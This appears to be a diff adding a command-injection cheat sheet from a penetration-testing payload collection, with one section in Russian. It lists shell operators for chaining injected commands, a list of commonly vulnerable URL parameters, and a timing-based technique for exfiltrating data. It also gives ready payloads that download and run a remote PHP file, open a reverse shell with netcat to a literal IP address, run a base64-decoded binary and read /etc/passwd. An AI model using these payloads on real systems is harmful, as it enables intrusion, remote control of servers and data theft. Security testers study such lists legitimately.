@@ -1,0 +1,72 @@
+Command Injection/Execution
+
+#Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id # Execute both
+ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+ls %0A id # %0A Execute both (RECOMMENDED)
+
+#Only unix supported
+`ls` # ``
+$(ls) # $()
+ls; id # ; Chain commands
+ls${LS_COLORS:10:1}${IFS}id # Might be useful
+
+#Not executed but may be interesting
+> /var/www/html/out.txt #Try to redirect the output to a file
+< /etc/passwd #Try to send some input to the command
+
+
+Ограничений Обход 
+Если вы пытаетесь выполнить  произвольные команды внутри Linux-машины,  вам будет интересно прочитать об этих  обходах: 
+Example:
+vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
+vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
+
+
+
+Parameters
+
+?cmd={payload}
+?exec={payload}
+?command={payload}
+?execute{payload}
+?ping={payload}
+?query={payload}
+?jump={payload}
+?code={payload}
+?reg={payload}
+?do={payload}
+?func={payload}
+?arg={payload}
+?option={payload}
+?load={payload}
+?process={payload}
+?step={payload}
+?read={payload}
+?function={payload}
+?req={payload}
+?feature={payload}
+?exe={payload}
+?module={payload}
+?payload={payload}
+?run={payload}
+?print={payload}
+
+
+
+
+Time based data exfiltration
+
+
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+real    0m5.007s
+user    0m0.000s
+sys 0m0.000s
+
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+real    0m0.002s
+user    0m0.000s
+sys 0m0.000s
